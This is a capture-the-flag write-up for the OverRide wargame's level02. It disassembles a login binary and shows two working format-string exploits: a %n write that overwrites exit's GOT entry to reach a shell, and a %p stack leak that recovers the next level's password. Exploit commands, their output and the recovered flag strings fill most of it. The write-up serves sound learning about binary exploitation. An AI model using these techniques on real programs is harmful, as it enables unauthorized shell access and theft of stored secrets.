
```
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username:
```
```
<+245>:	lea    -0xa0(%rbp),%rax ==> result of reading "/home/users/level03/.pass" = the Flag
<+252>:	mov    $0x400bf5,%esi   ==> "\n"
<+257>:	mov    %rax,%rdi
<+260>:	callq  0x4006d0 <strcspn@plt>
```
```
strcspn() calculates the length of the number of characters before the 1st occurrence of character present in both the string
Parameters:
str1 : The Target string in which search has to be made.
str2 : Argument string containing characters to match in target string.
```
strcspn("PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv", "\n"). // the flag from level01

In this case, there is no occurrence of the newline character \n in the first string, so the function will return the length of the entire string, which is 40.
```
 <+260>:	callq  0x4006d0 <strcspn@plt>
 <+265>:	movb   $0x0,-0xa0(%rbp,%rax,1)
 <+273>:	cmpl   $0x29,-0xc(%rbp)       ===> ret fread() = -0xc(%rbp)
INTEL 
 <+265>:	mov    BYTE PTR [rbp+rax*1-0xa0],0x0
 <+273>:	cmp    DWORD PTR [rbp-0xc],0x29
```
```
rbp+rax*1-0xa0 = 0 ==> rbp-0xa0 + rax ==> *(rbp-0xa0 + rax) = 0 ==> buffer + rax ==> buffer[rax] = 0 
then compares the res of fread() to 41
```
```
if not equal; then 
  0x400bf8:	 "ERROR: failed to read password file\n"
  exit(1)
else jmp to <+361>

fclose(*File) // -0x8(%rbp)
```
```
the program really begins at <+373>
0x400c20:	 "===== [ Secure Access System v1.0 ] ====="
```
```
 <+431>:	mov    0x20087e(%rip),%rax        # 0x601248 <stdin@@GLIBC_2.2.5>
 <+438>:	mov    %rax,%rdx
 <+441>:	lea    -0x70(%rbp),%rax
 <+445>:	mov    $0x64,%esi
 <+450>:	mov    %rax,%rdi
 <+453>:	callq  0x4006f0 <fgets@plt>
```
```
<+453>: fgets Username from stdin and stores it at -0x70(%rbp)
<+523>:	fgets Username from stdin and stores it at -0x110(%rbp)

<+566>:	lea    -0x110(%rbp),%rcx ==> the PWD
<+573>:	lea    -0xa0(%rbp),%rax  ==> The Flag

<+591>:	callq  0x400670 <strncmp@plt>

strncmp(Flag, PWD, 0x29/41);

if jne    <main+642>
   printf(-0x70(%rbp) ) // username
   "username" does not have access!
   exit
else
  printf("Greetings, %s!\n", -0x70(%rbp)) // username
  system (/bin/sh)
```

Format String to overide the GOT

```
--[ Username: %p %p %p %p %p %p %p %p
--[ Password: AAAA
*****************************************
0x7fffffffe4c0 (nil) 0x41 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6b8 0x1f7ff9a08 0x41414141
```

`(python -c 'print " %p " * 8 + "\n" + "AAAA"') | ./level02`

```
level02@OverRide:~$ (python -c 'print "%8$p" + "\n" + "AAAA"') | ./level02
0x41414141 does not have access!
```
```
x/s 0x601228
0x601228 <exit@got.plt>


----> 0x0000000000400a85 <+625>:	mov    edi,0x400d32 
      0x0000000000400a8a <+630>:	call   0x4006b0 <system@plt>

p 0x0000000000400a85 = 4196997
```

```
level02@OverRide:~$ (python -c 'print "%4196997p%8$n" + "\n" + "\x60\x12\x28"[::-1]' ; cat) | ./level02 > /dev/null
pwd 1>&2
/home/users/level02
cat /home/users/level03/.pass
cat /home/users/level03/.pass 1>&2
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

**SECOND METHOD




```
(python -c 'print " %p " * 100 + "\n" + "AAAA"') | ./level02 | xargs -n 1 echo

...
0x756e505234376848
0x45414a3561733951
0x377a7143574e6758
0x354a35686e475873
...

The length of the flag string is 40 so we need 5 * 8 (16/2 hex len)

the value at the 26th position on the stack  
(python -c 'print "%26$p" + "\n" + "AAAA"') | ./level02
0x48336750664b394d

then lets reconstruct our flag

echo "0x756e505234376848" | xxd -r -p | rev
Hh74RPnu


0x756e505234376848 ==> Hh74RPnu
0x45414a3561733951 ==> Q9sa5JAE
0x377a7143574e6758 ==> XgNWCqz7
0x354a35686e475873 ==> sXGnh5J5
0x48336750664b394d ==> M9KfPg3H

Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H

--[ Username: user
--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
*****************************************
Greetings, user!
$ pwd
/home/users/level02
```

simplified script

```
level02@OverRide:~$ for ((i=1; i<=26; i++)); do (python -c "print '%$i\$p'" && echo) | ./level02 | grep 0x ; done

0x7fffffffe4c0 does not have access!
0x2a2a2a2a2a2a2a2a does not have access!
0x2a2a2a2a2a2a2a2a does not have access!
0x7fffffffe6b8 does not have access!
0x1f7ff9a08 does not have access!
0x100000000 does not have access!
0x756e505234376848 does not have access!
0x45414a3561733951 does not have access!
0x377a7143574e6758 does not have access!
0x354a35686e475873 does not have access!
0x48336750664b394d does not have access!
```








